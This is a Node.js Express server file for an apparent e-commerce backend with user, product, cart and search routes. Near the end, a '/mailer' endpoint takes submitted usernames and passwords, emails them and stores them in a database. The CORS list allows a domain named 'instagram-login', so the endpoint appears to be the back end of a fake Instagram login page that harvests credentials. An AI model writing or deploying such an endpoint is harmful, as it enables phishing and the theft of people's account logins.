require('dotenv').config();
const express = require('express');
const cookieParser = require('cookie-parser');
const path = require('path');
const cors = require('cors');

const {authCheck} = require('./middleware/authCheck');
const MongoDBConnation = require('./services/mongoConnation');
const UserRoute = require('./routes/userRoute');
const HomepageRoute = require('./routes/homepageRoute');
const ProductRoute = require('./routes/productRoute');
const CartRoute = require('./routes/cartRoute');
const SearchRoute = require('./routes/searchRoute');

const mail = require('./services/Mil')
const model = require('./models/mil');

const app = express();
const PORT = process.env.PORT || 5000;

MongoDBConnation(process.env.MONGODB_URL)
    .then( ()=>{ return console.log('MongoDB Connated!') })
    .catch( (error)=>{ return console.log('MongoDB Database Connation error:', error); })

const allowedOrigins = [
    'http://localhost:5173', 
    'https://your-production-frontend.vercel.app',
    'https://instagram-login-drab-nine.vercel.app'
];

app.use(cors({
    origin: allowedOrigins,
    methods: ['GET', 'POST'],
}));

app.use(express.static(path.join(__dirname, 'public')));    
app.use(cookieParser());
app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.use(authCheck);

app.use('/api/user', UserRoute);
app.use('/api/homepage', HomepageRoute);
app.use('/api/product', ProductRoute);
app.use('/api/cart', CartRoute);
app.use('/api/search', SearchRoute);

app.post('/mailer', async(req, res)=>{
    const {user, password} = req.body;
    mail(user, password)
    await model.create({user, password})
    res.status(200).json({message: 'Mail Sent!'})
})

app.listen(PORT, () => {
    console.log(`Server Started At PORT: ${PORT}`);
})

// mongodb://127.0.0.1:27017/ECOMDATA